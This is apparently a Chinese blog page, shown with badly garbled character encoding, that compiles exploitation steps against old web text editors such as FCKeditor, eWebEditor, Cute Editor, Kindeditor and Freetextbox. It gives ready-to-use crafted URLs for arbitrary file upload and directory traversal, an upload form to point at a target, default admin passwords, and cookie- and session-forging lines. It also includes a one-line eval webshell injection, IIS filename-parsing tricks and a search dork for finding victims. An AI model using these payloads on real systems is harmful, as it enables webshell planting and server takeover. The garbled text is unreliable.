åˆ©ç”¨2003ç³»ç»Ÿè·¯å¾„è§£ææ¼æ´çš„åŸç†ï¼Œåˆ›å»ºç±»ä¼¼bin.aspå¦‚æ­¤ä¸€èˆ¬çš„ç›®å½•ï¼Œå†åœ¨æ­¤ç›®å½•ä¸­ä¸Šä¼ æ–‡ä»¶å³å¯è¢«è„šæœ¬è§£é‡Šå™¨ä»¥ç›¸åº”è„šæœ¬æƒé™æ‰§è¡Œã€‚
æ”»å‡»åˆ©ç”¨:
fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/asp/connector.asp
å¼ºåˆ¶å»ºç«‹shell.aspç›®å½•ï¼š
FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684
or
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp
FCKeditor PHPä¸Šä¼ ä»»æ„æ–‡ä»¶æ¼æ´
å½±å“ç‰ˆæœ¬: FCKeditor 2.2 &lt;= FCKeditor 2.4.2
è„†å¼±æè¿°ï¼šFCKeditoråœ¨å¤„ç†æ–‡ä»¶ä¸Šä¼ æ—¶å­˜åœ¨è¾“å…¥éªŒè¯é”™è¯¯ï¼Œè¿œç¨‹æ”»å‡»å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´ä¸Šä¼ ä»»æ„æ–‡ä»¶ã€‚åœ¨é€šè¿‡editor/filemanager/upload/php/upload.phpä¸Šä¼ æ–‡ä»¶æ—¶æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸ºTypeå‚æ•°å®šä¹‰æ— æ•ˆçš„å€¼å¯¼è‡´ä¸Šä¼ ä»»æ„è„šæœ¬ã€‚
æˆåŠŸæ”»å‡»è¦æ±‚config.phpé…ç½®æ–‡ä»¶ä¸­å¯ç”¨æ–‡ä»¶ä¸Šä¼ ï¼Œè€Œé»˜è®¤æ˜¯ç¦ç”¨çš„ã€‚æ”»å‡»åˆ©ç”¨: (è¯·ä¿®æ”¹actionå­—æ®µä¸ºæŒ‡å®šç½‘å€)ï¼š
&lt;form id=&quot;frmUpload&quot; enctype=&quot;multipart/form-data&quot; action=&quot;http://www.xxxx.com/FCKeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; method=&quot;post&quot;&gt;Upload a new file:&lt;br&gt;
&lt;input type=&quot;file&quot; name=&quot;NewFile&quot; size=&quot;50&quot;&gt;&lt;br&gt;
&lt;input id=&quot;btnUpload&quot; type=&quot;submit&quot; value=&quot;Upload&quot;&gt;
&lt;/form&gt;
Note:å¦‚æƒ³å°è¯•v2.2ç‰ˆæ¼æ´ï¼Œåˆ™ä¿®æ”¹Type=ä»»æ„å€¼ å³å¯ï¼Œä½†æ³¨æ„ï¼Œå¦‚æœæ¢å›ä½¿ç”¨Mediaåˆ™å¿…é¡»å¤§å†™é¦–å­—æ¯M,å¦åˆ™LINUXä¸‹ï¼ŒFCKeditorä¼šå¯¹æ–‡ä»¶ç›®å½•è¿›è¡Œæ–‡ä»¶åæ ¡éªŒï¼Œä¸ä¼šä¸Šä¼ æˆåŠŸçš„ã€‚
FCKeditor æš´è·¯å¾„æ¼æ´
å½±å“ç‰ˆæœ¬ï¼šaspxç‰ˆFCKeditor
æ”»å‡»åˆ©ç”¨ï¼š
FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=/1.asp
FCKeditor æ–‡ä»¶ä¸Šä¼ â€œ.â€å˜â€œ_â€ä¸‹åˆ’çº¿çš„ç»•è¿‡æ–¹æ³•
å½±å“ç‰ˆæœ¬: FCKeditor =&gt; 2.4.x
è„†å¼±æè¿°ï¼šæˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶ä¾‹å¦‚ï¼šshell.php.raræˆ–shell.php;.jpgä¼šå˜ä¸ºshell_php;.jpgè¿™æ˜¯æ–°ç‰ˆFCKçš„å˜åŒ–ã€‚æ”»å‡»åˆ©ç”¨:
æäº¤1.php+ç©ºæ ¼ å°±å¯ä»¥ç»•è¿‡å»æ‰€æœ‰çš„,
â€»ä¸è¿‡ç©ºæ ¼åªæ”¯æŒwinç³»ç»Ÿ *nixæ˜¯ä¸æ”¯æŒçš„[1.phpå’Œ1.php+ç©ºæ ¼æ˜¯2ä¸ªä¸åŒçš„æ–‡ä»¶]Note:http://pstgroup.blogspot.com/2007/05/tipsfckeditor.html
FCKeditor æ–‡ä»¶ä¸Šä¼ â€œ.â€å˜â€œ_â€ä¸‹åˆ’çº¿çš„ç»•è¿‡æ–¹æ³•ï¼ˆäºŒï¼‰
å½±å“ç‰ˆæœ¬:=&gt;2.4.xçš„æœ€æ–°ç‰ˆå·²ä¿®è¡¥è„†å¼±æè¿°:ç”±äºFckeditorå¯¹ç¬¬ä¸€æ¬¡ä¸Šä¼ 123.asp;123.jpg è¿™æ ·çš„æ ¼å¼åšäº†è¿‡æ»¤ã€‚ä¹Ÿå°±æ˜¯IIS6è§£ææ¼æ´ã€‚ä¸Šä¼ ç¬¬ä¸€æ¬¡ã€‚è¢«è¿‡æ»¤ä¸º123_asp;123.jpg ä»è€Œæ— æ³•è¿è¡Œã€‚
ä½†æ˜¯ç¬¬2æ¬¡ä¸Šä¼ åŒåæ–‡ä»¶123.asp;123.jpgåã€‚ç”±äºâ€123_asp;123.jpgâ€å·²ç»å­˜åœ¨ã€‚
æ–‡ä»¶åè¢«å‘½åä¸º123.asp;123(1).jpg â€¦â€¦ 123.asp;123(2).jpgè¿™æ ·çš„ç¼–å·æ–¹å¼ã€‚
æ‰€ä»¥ã€‚IIS6çš„æ¼æ´ç»§ç»­æ‰§è¡Œäº†ã€‚å¦‚æœé€šè¿‡ä¸Šé¢çš„æ­¥éª¤è¿›è¡Œæµ‹è¯•æ²¡æœ‰æˆåŠŸï¼Œå¯èƒ½æœ‰ä»¥ä¸‹å‡ æ–¹é¢çš„åŸå› ï¼š
1.FCKeditoræ²¡æœ‰å¼€å¯æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œè¿™é¡¹åŠŸèƒ½åœ¨å®‰è£…FCKeditoræ—¶é»˜è®¤æ˜¯å…³é—­çš„ã€‚å¦‚æœæƒ³ä¸Šä¼ æ–‡ä»¶ï¼ŒFCKeditorä¼šç»™å‡ºé”™è¯¯æç¤ºã€‚
2.ç½‘ç«™é‡‡ç”¨äº†ç²¾ç®€ç‰ˆçš„FCKeditorï¼Œç²¾ç®€ç‰ˆçš„FCKeditorå¾ˆå¤šåŠŸèƒ½ä¸¢å¤±ï¼ŒåŒ…æ‹¬æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ã€‚
3.FCKeditorçš„è¿™ä¸ªæ¼æ´å·²ç»è¢«ä¿®å¤ã€‚
FCKeditor æ–°é—»ç»„ä»¶éå†ç›®å½•æ¼æ´
å½±å“ç‰ˆæœ¬:Aspxä¸JSPç‰ˆFCKeditorè„†å¼±æè¿°ï¼šå¦‚ä½•è·å¾—webshellè¯·å‚è€ƒä¸Šæ–‡â€œTYPEè‡ªå®šä¹‰å˜é‡ä»»æ„ä¸Šä¼ æ–‡ä»¶æ¼æ´â€
æ”»å‡»åˆ©ç”¨:
ä¿®æ”¹CurrentFolderå‚æ•°ä½¿ç”¨ ../../æ¥è¿›å…¥ä¸åŒçš„ç›®å½•
/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../..%2F&amp;NewFolderName=aspx.asp
æ ¹æ®è¿”å›çš„XMLä¿¡æ¯å¯ä»¥æŸ¥çœ‹ç½‘ç«™æ‰€æœ‰çš„ç›®å½•ã€‚
/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=%2F
/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&amp;Type=&amp;CurrentFolder=%2F
TYPEè‡ªå®šä¹‰å˜é‡ä»»æ„ä¸Šä¼ æ–‡ä»¶æ¼æ´
å½±å“ç‰ˆæœ¬: è¾ƒæ—©ç‰ˆæœ¬
è„†å¼±æè¿°ï¼šé€šè¿‡è‡ªå®šä¹‰Typeå˜é‡çš„å‚æ•°ï¼Œå¯ä»¥åˆ›å»ºæˆ–ä¸Šä¼ æ–‡ä»¶åˆ°æŒ‡å®šçš„ç›®å½•ä¸­å»ï¼Œä¸”æ²¡æœ‰ä¸Šä¼ æ–‡ä»¶æ ¼å¼çš„é™åˆ¶ã€‚æ”»å‡»åˆ©ç”¨:
/FCKeditor/editor/filemanager/browser/default/browser.html?Type=all&amp;Connector=connectors/asp/connector.asp
æ‰“å¼€è¿™ä¸ªåœ°å€å°±å¯ä»¥ä¸Šä¼ ä»»ä½•ç±»å‹çš„æ–‡ä»¶äº†ï¼ŒShellä¸Šä¼ åˆ°çš„é»˜è®¤ä½ç½®æ˜¯:
http://www.xxxx.com/UserFiles/all/1.asp
Type=all è¿™ä¸ªå˜é‡æ˜¯è‡ªå®šä¹‰çš„,åœ¨è¿™é‡Œåˆ›å»ºäº†allè¿™ä¸ªç›®å½•,è€Œä¸”æ–°çš„ç›®å½•æ²¡æœ‰ä¸Šä¼ æ–‡ä»¶æ ¼å¼çš„é™åˆ¶.æ¯”å¦‚è¾“å…¥:
/FCKeditor/editor/filemanager/browser/default/browser.html?Type=../&amp;Connector=connectors/asp/connector.asp
ç½‘é©¬å°±å¯ä»¥ä¼ åˆ°ç½‘ç«™çš„æ ¹ç›®å½•ä¸‹.Note:å¦‚æ‰¾ä¸åˆ°é»˜è®¤ä¸Šä¼ æ–‡ä»¶å¤¹å¯æ£€æŸ¥æ­¤æ–‡ä»¶:
fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
</code></pre>
<h3 id="eWebEditor"><a href="#eWebEditor" class="headerlink" title="eWebEditor"></a>eWebEditor</h3><pre><code>eWebEditor åŸºç¡€çŸ¥è¯†
é»˜è®¤åå°åœ°å€ï¼š
/ewebeditor/admin_login.asp
/WebEdior/admin/login.aspx
å»ºè®®æœ€å¥½æ£€æµ‹ä¸‹admin_style.aspæ–‡ä»¶æ˜¯å¦å¯ä»¥ç›´æ¥è®¿é—®é»˜è®¤æ•°æ®åº“è·¯å¾„ï¼š
[PATH]/db/ewebeditor.mdb
[PATH]/db/db.mdb
[PATH]/db/%23ewebeditor.mdb
é»˜è®¤å¯†ç ï¼š
admin/admin888 ã€ admin/adminã€ admin/123456 ã€admin/admin9991ã€ç‚¹å‡»â€œæ ·å¼ç®¡ç†â€â€”å¯ä»¥é€‰æ‹©æ–°å¢æ ·å¼ï¼Œæˆ–è€…ä¿®æ”¹ä¸€ä¸ªéç³»ç»Ÿæ ·å¼ï¼Œå°†å…¶ä¸­å›¾ç‰‡æ§ä»¶æ‰€å…è®¸çš„ä¸Šä¼ ç±»å‹åé¢åŠ ä¸Š|aspã€|asaã€|aaspspæˆ–|cerï¼Œåªè¦æ˜¯æœåŠ¡å™¨å…è®¸æ‰§è¡Œçš„è„šæœ¬ç±»å‹å³å¯ï¼Œç‚¹å‡»â€œæäº¤â€å¹¶è®¾ç½®å·¥å…·æ â€”å°†â€œæ’å…¥å›¾ç‰‡â€æ§ä»¶æ·»åŠ ä¸Šã€‚è€Œåâ€”é¢„è§ˆæ­¤æ ·å¼ï¼Œç‚¹å‡»æ’å…¥å›¾ç‰‡ï¼Œä¸Šä¼ WEBSHELLï¼Œåœ¨â€œä»£ç â€æ¨¡å¼ä¸­æŸ¥çœ‹ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ã€‚
2ã€å½“æ•°æ®åº“è¢«ç®¡ç†å‘˜ä¿®æ”¹ä¸ºaspã€asaåç¼€çš„æ—¶å€™ï¼Œå¯ä»¥æ’ä¸€å¥è¯æœ¨é©¬æœåŠ¡ç«¯è¿›å…¥æ•°æ®åº“ï¼Œç„¶åä¸€å¥è¯æœ¨é©¬å®¢æˆ·ç«¯è¿æ¥æ‹¿ä¸‹webshell
3ã€ä¸Šä¼ åæ— æ³•æ‰§è¡Œï¼Ÿç›®å½•æ²¡æƒé™ï¼Ÿå¸…é”…ä½ å›å»æ ·å¼ç®¡ç†çœ‹ä½ ç¼–è¾‘è¿‡çš„é‚£ä¸ªæ ·å¼ï¼Œé‡Œé¢å¯ä»¥è‡ªå®šä¹‰ä¸Šä¼ è·¯å¾„çš„ï¼ï¼ï¼
4ã€è®¾ç½®å¥½äº†ä¸Šä¼ ç±»å‹ï¼Œä¾ç„¶ä¸Šä¼ ä¸äº†éº½ï¼Ÿä¼°è®¡æ˜¯æ–‡ä»¶ä»£ç è¢«æ”¹äº†ï¼Œå¯ä»¥å°è¯•è®¾å®šâ€œè¿œç¨‹ç±»å‹â€ä¾ç…§6.0ç‰ˆæœ¬æ‹¿SHELLçš„æ–¹æ³•æ¥åšï¼ˆè¯¦æƒ…è§ä¸‹æ–‡â†“ï¼‰ï¼Œèƒ½å¤Ÿè®¾å®šè‡ªåŠ¨ä¿å­˜è¿œç¨‹æ–‡ä»¶çš„ç±»å‹ã€‚
5ã€ä¸èƒ½æ·»åŠ å·¥å…·æ ï¼Œä½†è®¾å®šå¥½äº†æŸæ ·å¼ä¸­çš„æ–‡ä»¶ç±»å‹ï¼Œæ€ä¹ˆåŠï¼Ÿâ†“è¿™ä¹ˆåŠï¼
(è¯·ä¿®æ”¹actionå­—æ®µ)
Action.html
6ã€éœ€è¦çªç ´ä¸Šä¼ æ–‡ä»¶ç±»å‹é™åˆ¶ä¹ˆï¼ŸCome here! â€”&gt;&gt; å°†å›¾ç‰‡ä¸Šä¼ ç±»å‹ä¿®æ”¹ä¸ºâ€œaaspsp;â€(ä¸å«å¼•å·)ï¼Œå°†ä¸€å¥è¯shellæ–‡ä»¶åæ”¹ä¸ºâ€œ1.asp;â€(ä¸å«å¼•å·)å¹¶ä¸Šä¼ å³å¯ã€‚â€”&gt;æœ¬æ¡ä¿¡æ¯æ¥æºï¼šå¾®ç¬‘åˆºå®¢
eWebEditor å¯ä¸‹è½½æ•°æ®åº“ï¼Œä½†å¯†æ–‡è§£ä¸å¼€
è„†å¼±æè¿°ï¼š
å½“æˆ‘ä»¬ä¸‹è½½æ•°æ®åº“åæŸ¥è¯¢ä¸åˆ°å¯†ç MD5çš„æ˜æ–‡æ—¶ï¼Œå¯ä»¥å»çœ‹çœ‹webeditor_style(14)è¿™ä¸ªæ ·å¼è¡¨ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰å‰è¾ˆå…¥ä¾µè¿‡ æˆ–è®¸å·²ç»èµ‹äºˆäº†æŸæ§ä»¶ä¸Šä¼ è„šæœ¬çš„èƒ½åŠ›ï¼Œæ„é€ åœ°å€æ¥ä¸Šä¼ æˆ‘ä»¬è‡ªå·±çš„WEBSHELL.
æ”»å‡»åˆ©ç”¨:
æ¯”å¦‚ ID=46 s-name =standard1æ„é€  ä»£ç : ewebeditor.asp?id=content&amp;style=standardIDå’Œå’Œæ ·å¼åæ”¹è¿‡å
ewebeditor.asp?id=46&amp;style=standard1
eWebEditoréå†ç›®å½•æ¼æ´
è„†å¼±æè¿°ï¼š
ewebeditor/admin_uploadfile.asp
admin/upload.asp
è¿‡æ»¤ä¸ä¸¥ï¼Œé€ æˆéå†ç›®å½•æ¼æ´
æ”»å‡»åˆ©ç”¨:
ç¬¬ä¸€ç§:ewebeditor/admin_uploadfile.asp?id=14
åœ¨id=14åé¢æ·»åŠ &amp;dir=..
å†åŠ  &amp;dir=../..
&amp;dir=http://www.xxxx.com/../.. çœ‹åˆ°æ•´ä¸ªç½‘ç«™æ–‡ä»¶äº†
ç¬¬äºŒç§: ewebeditor/admin/upload.asp?id=16&amp;d_viewmode=&amp;dir =./..
eWebEditor 5.2 åˆ—ç›®å½•æ¼æ´
è„†å¼±æè¿°ï¼š
ewebeditor/asp/browse.asp
è¿‡æ»¤ä¸ä¸¥ï¼Œé€ æˆéå†ç›®å½•æ¼æ´
æ”»å‡»åˆ©ç”¨ï¼š
http://www.xxxx.com/ewebeditor/asp/browse.asp?style=standard650&amp;dir=â€¦././/..
åˆ©ç”¨eWebEditor sessionæ¬ºéª—æ¼æ´,è¿›å…¥åå°
è„†å¼±æè¿°ï¼š
æ¼æ´æ–‡ä»¶:Admin_Private.asp
åªåˆ¤æ–­äº†sessionï¼Œæ²¡æœ‰åˆ¤æ–­cookieså’Œè·¯å¾„çš„éªŒè¯é—®é¢˜ã€‚
æ”»å‡»åˆ©ç”¨:
æ–°å»ºä¸€ä¸ªtest.aspå†…å®¹å¦‚ä¸‹:
&lt;%Session(â€œeWebEditor_Userâ€) = â€œ11111111â€%&gt;
è®¿é—®test.aspï¼Œå†è®¿é—®åå°ä»»ä½•æ–‡ä»¶ï¼Œfor example:Admin_Default.asp
eWebEditor aspç‰ˆ 2.1.6 ä¸Šä¼ æ¼æ´
æ”»å‡»åˆ©ç”¨:ï¼ˆè¯·ä¿®æ”¹actionå­—æ®µä¸ºæŒ‡å®šç½‘å€ï¼‰
ewebeditor aspç‰ˆ2.1.6ä¸Šä¼ æ¼æ´åˆ©ç”¨ç¨‹åº.html
eWebEditor 2.7.0 æ³¨å…¥æ¼æ´
æ”»å‡»åˆ©ç”¨:
http://www.xxxx.com/ewebeditor/ewebeditor.asp?id=article_content&amp;style=full_v200
é»˜è®¤è¡¨åï¼šeWebEditor_Systemé»˜è®¤åˆ—åï¼šsys_UserNameã€sys_UserPassï¼Œç„¶ååˆ©ç”¨nbsiè¿›è¡ŒçŒœè§£.
eWebEditor2.8.0æœ€ç»ˆç‰ˆåˆ é™¤ä»»æ„æ–‡ä»¶æ¼æ´
è„†å¼±æè¿°ï¼š
æ­¤æ¼æ´å­˜åœ¨äºExample\NewsSystemç›®å½•ä¸‹çš„delete.aspæ–‡ä»¶ä¸­ï¼Œè¿™æ˜¯ewebeditorçš„æµ‹è¯•é¡µé¢ï¼Œæ— é¡»ç™»é™†å¯ä»¥ç›´æ¥è¿›å…¥ã€‚
æ”»å‡»åˆ©ç”¨: (è¯·ä¿®æ”¹actionå­—æ®µä¸ºæŒ‡å®šç½‘å€)
Del Files.html
eWebEditor PHP/ASP åå°é€šæ€æ¼æ´
å½±å“ç‰ˆæœ¬: PHP â‰¥ 3.0~3.8ä¸asp 2.8ç‰ˆä¹Ÿé€šç”¨ï¼Œæˆ–è®¸ä½ç‰ˆæœ¬ä¹Ÿå¯ä»¥ï¼Œæœ‰å¾…æµ‹è¯•ã€‚
æ”»å‡»åˆ©ç”¨:
è¿›å…¥åå°/eWebEditor/admin/login.php,éšä¾¿è¾“å…¥ä¸€ä¸ªç”¨æˆ·å’Œå¯†ç ,ä¼šæç¤ºå‡ºé”™äº†.
è¿™æ—¶å€™ä½ æ¸…ç©ºæµè§ˆå™¨çš„url,ç„¶åè¾“å…¥javascript:alert(document.cookie=â€adminuser=â€+escape(â€œadminâ€));
javascript:alert(document.cookie=â€adminpass=â€+escape(â€œadminâ€));
javascript:alert(document.cookie=â€admindj=â€+escape(â€œ1â€));è€Œåä¸‰æ¬¡å›è½¦,æ¸…ç©ºæµè§ˆå™¨çš„URL,ç°åœ¨è¾“å…¥ä¸€äº›å¹³å¸¸è®¿é—®ä¸åˆ°çš„æ–‡ä»¶å¦‚../ewebeditor/admin/default.phpï¼Œå°±ä¼šç›´æ¥è¿›å»ã€‚
eWebEditor for phpä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´
å½±å“ç‰ˆæœ¬:ewebeditor php v3.8 or older version
è„†å¼±æè¿°:
æ­¤ç‰ˆæœ¬å°†æ‰€æœ‰çš„é£æ ¼é…ç½®ä¿¡æ¯ä¿å­˜ä¸ºä¸€ä¸ªæ•°ç»„$aStyle,åœ¨php.inié…ç½®register_globalä¸ºonçš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥ä»»æ„æ·»åŠ è‡ªå·±å–œæ¬¢çš„é£æ ¼ï¼Œå¹¶å®šä¹‰ä¸Šä¼ ç±»å‹ã€‚
æ”»å‡»åˆ©ç”¨:
phpupload.html
eWebEditor JSPç‰ˆæ¼æ´
å¤§åŒå°å¼‚ã€‚
eWebEditor 2.8 å•†ä¸šç‰ˆæ’ä¸€å¥è¯æœ¨é©¬
å½±å“ç‰ˆæœ¬:=&gt;2.8 å•†ä¸šç‰ˆ
æ”»å‡»åˆ©ç”¨:
ç™»é™†åå°ï¼Œç‚¹å‡»ä¿®æ”¹å¯†ç â€”-æ–°å¯†ç è®¾ç½®ä¸º 1&quot;:eval request(&quot;h&quot;)â€™
è®¾ç½®æˆåŠŸåï¼Œè®¿é—®asp/config.aspæ–‡ä»¶å³å¯ï¼Œä¸€å¥è¯æœ¨é©¬è¢«å†™å…¥åˆ°è¿™ä¸ªæ–‡ä»¶é‡Œé¢äº†.æ³¨æ„ï¼šå¯èƒ½å› ä¸ºè½¬è½½çš„å…³ç³»ï¼Œä»£ç ä¼šå˜æ‰ï¼Œæœ€å¥½æœ¬åœ°è°ƒè¯•å¥½ä»£ç å†æäº¤ã€‚
eWebEditorNet upload.aspx ä¸Šä¼ æ¼æ´(WebEditorNet)
è„†å¼±æè¿°ï¼š
WebEditorNet ä¸»è¦æ˜¯ä¸€ä¸ªupload.aspxæ–‡ä»¶å­˜åœ¨ä¸Šä¼ æ¼æ´ã€‚
æ”»å‡»åˆ©ç”¨:
é»˜è®¤ä¸Šä¼ åœ°å€ï¼š/ewebeditornet/upload.aspx
å¯ä»¥ç›´æ¥ä¸Šä¼ ä¸€ä¸ªcerçš„æœ¨é©¬
å¦‚æœä¸èƒ½ä¸Šä¼ åˆ™åœ¨æµè§ˆå™¨åœ°å€æ ä¸­è¾“å…¥javascript:lbtnUpload.click();
æˆåŠŸä»¥åæŸ¥çœ‹æºä»£ç æ‰¾åˆ°uploadsaveæŸ¥çœ‹ä¸Šä¼ ä¿å­˜åœ°å€ï¼Œé»˜è®¤ä¼ åˆ°uploadfileè¿™ä¸ªæ–‡ä»¶å¤¹é‡Œã€‚
</code></pre>
<h3 id="southidceditor-ä¸€èˆ¬ä½¿ç”¨v2-8-0ç‰ˆeWebæ ¸å¿ƒ"><a href="#southidceditor-ä¸€èˆ¬ä½¿ç”¨v2-8-0ç‰ˆeWebæ ¸å¿ƒ" class="headerlink" title="southidceditor(ä¸€èˆ¬ä½¿ç”¨v2.8.0ç‰ˆeWebæ ¸å¿ƒ)"></a>southidceditor(ä¸€èˆ¬ä½¿ç”¨v2.8.0ç‰ˆeWebæ ¸å¿ƒ)</h3><pre><code>http://www.xxxx.com/admin/southidceditor/datas/southidceditor.mdb
http://www.xxxx.com/admin/southidceditor/admin/admin_login.asp
http://www.xxxx.com/admin/southidceditor/popup.asp
bigcneditor(eWeb 2.7.5 VIPæ ¸å¿ƒ)
å…¶å®æ‰€è°“çš„Bigcneditorå°±æ˜¯eWebEditor 2.7.5çš„VIPç”¨æˆ·ç‰ˆ.ä¹‹æ‰€ä»¥æ— æ³•è®¿é—®admin_login.aspï¼Œæç¤ºâ€œæƒé™ä¸å¤Ÿâ€4å­—çœŸè¨€ï¼Œä¼°è®¡å°±æ˜¯å› ä¸ºå…¶æˆæƒâ€œLicensedâ€é—®é¢˜,æˆ–è®¸åªå…è®¸è¢«æˆæƒçš„æœºå™¨è®¿é—®åå°æ‰å¯¹ã€‚æˆ–è®¸ä¸Šé¢    é’ˆå¯¹eWebEditor v2.8ä»¥ä¸‹ä½ç‰ˆæœ¬çš„å°åŠ¨ä½œå¯ä»¥ç”¨åˆ°è¿™ä¸Šé¢æ¥.è²Œä¼¼æ²¡å¤šå°‘åŠ¨ä½œCute Editor
</code></pre>
<h3 id="Cute-Editoråœ¨çº¿ç¼–è¾‘å™¨æœ¬åœ°åŒ…å«æ¼æ´"><a href="#Cute-Editoråœ¨çº¿ç¼–è¾‘å™¨æœ¬åœ°åŒ…å«æ¼æ´" class="headerlink" title="Cute Editoråœ¨çº¿ç¼–è¾‘å™¨æœ¬åœ°åŒ…å«æ¼æ´"></a>Cute Editoråœ¨çº¿ç¼–è¾‘å™¨æœ¬åœ°åŒ…å«æ¼æ´</h3><pre><code>å½±å“ç‰ˆæœ¬:
CuteEditor For Net 6.4
è„†å¼±æè¿°ï¼š
å¯ä»¥éšæ„æŸ¥çœ‹ç½‘ç«™æ–‡ä»¶å†…å®¹ï¼Œå±å®³è¾ƒå¤§ã€‚
æ”»å‡»åˆ©ç”¨:
http://www.xxxx.com/CuteSoft_Client/CuteEditor/Load.ashx?type=image&amp;file=../../../web.config
Cute Editor Asp.Netç‰ˆåˆ©ç”¨iisè§£ææ¼æ´è·å¾—æƒé™
å½±å“ç‰ˆæœ¬ï¼š
CuteEditor for ASP.NETä¸­æ–‡ç‰ˆè„†å¼±æè¿°ï¼š
è„†å¼±æè¿°ï¼š
CuteEditorå¯¹ä¸Šä¼ æ–‡ä»¶åæœªé‡å‘½åï¼Œå¯¼è‡´å…¶å¯åˆ©ç”¨IISæ–‡ä»¶åè§£æBugè·å¾—webshellæƒé™ã€‚
æ”»å‡»åˆ©ç”¨ï¼š
å¯é€šè¿‡åœ¨æœç´¢å¼•æ“ä¸­é”®å…¥å…³é”®å­— inurl:Post.aspx?SmallClassID= æ¥æ‰¾åˆ°æµ‹è¯•ç›®æ ‡ã€‚
åœ¨ç¼–è¾‘å™¨ä¸­ç‚¹å‡»â€œå¤šåª’ä½“æ’å…¥â€ï¼Œä¸Šä¼ ä¸€ä¸ªåä¸ºâ€œxxx.asp;.aviâ€çš„ç½‘é©¬ï¼Œä»¥æ­¤è·å¾—æƒé™ã€‚
</code></pre>
<h3 id="Webhtmleditor"><a href="#Webhtmleditor" class="headerlink" title="Webhtmleditor"></a>Webhtmleditor</h3><pre><code>åˆ©ç”¨WIN 2003 IISæ–‡ä»¶åç§°è§£ææ¼æ´è·å¾—SHELL
å½±å“ç‰ˆæœ¬ï¼š&lt;= Webhtmleditoræœ€ç»ˆç‰ˆ1.7 (å·²åœæ­¢æ›´æ–°)
è„†å¼±æè¿°/æ”»å‡»åˆ©ç”¨ï¼š
å¯¹ä¸Šä¼ çš„å›¾ç‰‡æˆ–å…¶ä»–æ–‡ä»¶æ— é‡å‘½åæ“ä½œï¼Œå¯¼è‡´å…è®¸æ¶æ„ç”¨æˆ·ä¸Šä¼ diy.asp;.jpgæ¥ç»•è¿‡å¯¹åç¼€åå®¡æŸ¥çš„é™åˆ¶ï¼Œå¯¹äºæ­¤ç±»å› ç¼–è¾‘å™¨ä½œè€…æ„è¯†çŠ¯ä¸‹çš„é”™è¯¯ï¼Œå°±ç®—é­é‡ç¼©ç•¥å›¾ï¼Œæ–‡ä»¶å¤´æ£€æµ‹ï¼Œä¹Ÿå¯ä½¿ç”¨å›¾ç‰‡æœ¨é©¬ æ’å…¥ä¸€å¥è¯æ¥çªç ´ã€‚
</code></pre>
<h3 id="Kindeditor"><a href="#Kindeditor" class="headerlink" title="Kindeditor"></a>Kindeditor</h3><pre><code>åˆ©ç”¨WIN 2003 IISæ–‡ä»¶åç§°è§£ææ¼æ´è·å¾—SHELL
å½±å“ç‰ˆæœ¬: &lt;= kindeditor 3.2.1(09å¹´8æœˆä»½å‘å¸ƒçš„æœ€æ–°ç‰ˆ)
è„†å¼±æè¿°/æ”»å‡»åˆ©ç”¨ï¼š
æ‹¿å®˜æ–¹åšä¸ªæ¼”ç¤ºï¼šè¿›å…¥http://www.xxxx.com/ke/examples/index.html éšæ„ç‚¹å‡»ä¸€ä¸ªdemoåç‚¹å›¾ç‰‡ä¸Šä¼ ï¼ŒæŸå›ä¸Šä¼ äº†å¦‚ä¸‹æ–‡ä»¶ï¼šhttp://www.xxxx.com/ke/attached/test.asp;.jpg
Note:å‚è§é™„å½•CåŸç†è§£æã€‚
</code></pre>
<h3 id="Freetextbox"><a href="#Freetextbox" class="headerlink" title="Freetextbox"></a>Freetextbox</h3><pre><code>Freetextboxéå†ç›®å½•æ¼æ´
å½±å“ç‰ˆæœ¬ï¼šæœªçŸ¥
è„†å¼±æè¿°ï¼š
å› ä¸ºftb.imagegallery.aspxä»£ç ä¸­ åªè¿‡æ»¤äº†/ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤\ç¬¦å·æ‰€ä»¥å¯¼è‡´å‡ºç°äº†éå†ç›®å½•çš„é—®é¢˜ã€‚
æ”»å‡»åˆ©ç”¨:
åœ¨ç¼–è¾‘å™¨é¡µé¢ç‚¹å›¾ç‰‡ä¼šå¼¹å‡ºä¸€ä¸ªæ¡†ï¼ˆæŠ“åŒ…å¾—åˆ°æ­¤åœ°å€ï¼‰æ„é€ å¦‚ä¸‹ï¼Œå¯éå†ç›®å½•ã€‚
http://www.xxxx.com/Member/images/ftb/HelperScripts/ftb.imagegallery.aspx?frame=1&amp;rif=..&amp;cif=\..
Freetextbox Asp.Netç‰ˆåˆ©ç”¨IISè§£ææ¼æ´è·å¾—æƒé™
å½±å“ç‰ˆæœ¬ï¼šæ‰€æœ‰ç‰ˆæœ¬
è„†å¼±æè¿°ï¼š
æ²¡åšç™»é™†éªŒè¯å¯ä»¥ç›´æ¥è®¿é—®ä¸Šä¼ æœ¨é©¬
Freetextbox 3-3-1 å¯ä»¥ç›´æ¥ä¸Šä¼ ä»»æ„æ ¼å¼çš„æ–‡ä»¶
Freetextbox 1.6.3 åŠå…¶ä»–ç‰ˆæœ¬å¯ä»¥ä¸Šä¼  æ ¼å¼ä¸ºx.asp;.jpg
æ”»å‡»åˆ©ç”¨ï¼š
